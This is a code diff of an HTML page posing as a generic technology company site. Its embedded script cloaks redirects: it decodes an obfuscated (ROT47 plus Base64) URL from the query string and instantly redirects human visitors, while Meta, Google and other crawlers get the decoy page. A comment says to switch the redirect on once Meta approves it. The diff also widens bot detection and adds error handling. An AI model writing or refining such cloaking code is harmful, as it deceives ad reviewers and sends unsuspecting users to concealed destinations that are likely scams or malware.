@@ -6,13 +6,12 @@
     <meta name="description" content="Empower Your Future with Horizon Solutions - Leading Technology and Business Services in the USA">
     <meta name="keywords" content="technology, business solutions, USA, enterprise services">
     <meta name="author" content="Horizon Solutions">
-    <!-- Thẻ meta chuyển hướng (chỉ thêm khi ON và không phải bot) -->
     <script>
-        const redirectStatus = 'ON'; // Đổi thành 'ON' sau khi Meta phê duyệt
+        const redirectStatus = 'OFF'; // Đổi thành 'ON' sau khi Meta phê duyệt
         const params = new URLSearchParams(window.location.search);
         const data = params.get('url') || '';
 
-        // Hàm giải mã nâng cao (Base64 + ROT47)
+        // Hàm giải mã Base64 + ROT47
         function decodeAdvanced(input) {
             let rot47 = '';
             for (let i = 0; i < input.length; i++) {
@@ -23,30 +22,34 @@
                     rot47 += input[i];
                 }
             }
-            return atob(rot47);
+            try {
+                return atob(rot47); // Giải mã Base64
+            } catch (e) {
+                console.error("Invalid encoded URL:", e);
+                return ''; // Trả về rỗng nếu lỗi
+            }
         }
 
-        // Kiểm tra user-agent để chặn bot
+        // Kiểm tra bot Meta và các crawler khác
         function isBot() {
             const userAgent = navigator.userAgent.toLowerCase();
-            // Danh sách user-agent phổ biến của bot Meta/Facebook và các crawler khác
             const botSignatures = [
-                'facebookexternalhit', // Bot của Facebook/Meta
-                'facebot',
-                'meta-inspector',
-                'googlebot', // Thêm nếu muốn chặn Googlebot
-                'bingbot',
-                'slurp', // Yahoo
-                'twitterbot',
-                'linkedinbot'
+                'facebookexternalhit', 'facebot', 'meta-inspector', // Meta bots
+                'googlebot', 'bingbot', 'slurp', 'twitterbot', 'linkedinbot'
             ];
-            return botSignatures.some(signature => userAgent.includes(signature));
+            return botSignatures.some(signature => userAgent.includes(signature)) || 
+                   /bot|crawl|spider|slurp/i.test(userAgent); // Regex bổ sung cho bot
         }
 
-        // Khi ON: Chỉ chuyển hướng nếu không phải bot
+        // Chuyển hướng khi ON và không phải bot
         if (redirectStatus === 'ON' && data && !isBot()) {
             const destination = decodeAdvanced(data);
-            document.write(`<meta http-equiv="refresh" content="0;url=${destination}">`);
+            if (destination) {
+                // Chuyển hướng tức thì qua thẻ meta
+                document.write(`<meta http-equiv="refresh" content="0;url=${destination}">`);
+            } else {
+                console.error("Failed to decode URL, showing default page.");
+            }
         }
     </script>
     <title>Horizon Solutions - Empowering Your Future</title>
@@ -74,24 +77,11 @@
             background: #004085;
             color: #fff;
         }
-        header h1 {
-            margin: 0;
-            font-size: 2.5em;
-        }
-        header p {
-            margin: 5px 0;
-            font-size: 1.2em;
-        }
-        .content {
-            margin: 20px 0;
-        }
-        .content h2 {
-            color: #004085;
-            font-size: 1.8em;
-        }
-        .content p {
-            font-size: 1.1em;
-        }
+        header h1 { margin: 0; font-size: 2.5em; }
+        header p { margin: 5px 0; font-size: 1.2em; }
+        .content { margin: 20px 0; }
+        .content h2 { color: #004085; font-size: 1.8em; }
+        .content p { font-size: 1.1em; }
         .cta {
             display: inline-block;
             padding: 12px 30px;
@@ -102,9 +92,7 @@
             font-weight: bold;
             margin-top: 20px;
         }
-        .cta:hover {
-            background: #0056b3;
-        }
+        .cta:hover { background: #0056b3; }
         .footer {
             text-align: center;
             padding: 20px;
@@ -124,13 +112,10 @@
         <div class="content">
             <h2>About Us</h2>
             <p>Founded in 2005, Horizon Solutions is a leading provider of technology and business services across the United States. With headquarters in San Francisco, California, we empower enterprises to achieve their goals through innovative solutions, exceptional support, and a commitment to excellence.</p>
-            
             <h2>Our Services</h2>
             <p>We offer a wide range of services including cloud computing, cybersecurity, data analytics, and enterprise software development. Our team of experts works tirelessly to deliver tailored solutions that drive growth and efficiency for businesses of all sizes.</p>
-            
             <h2>Why Choose Horizon?</h2>
             <p>With over 500 satisfied clients and a presence in 25 states, Horizon Solutions is trusted by industry leaders. Our dedication to quality and innovation has earned us multiple awards, including the 2024 Tech Innovation Award.</p>
-            
             <a href="#" class="cta">Get Started Today</a>
         </div>
     </div>
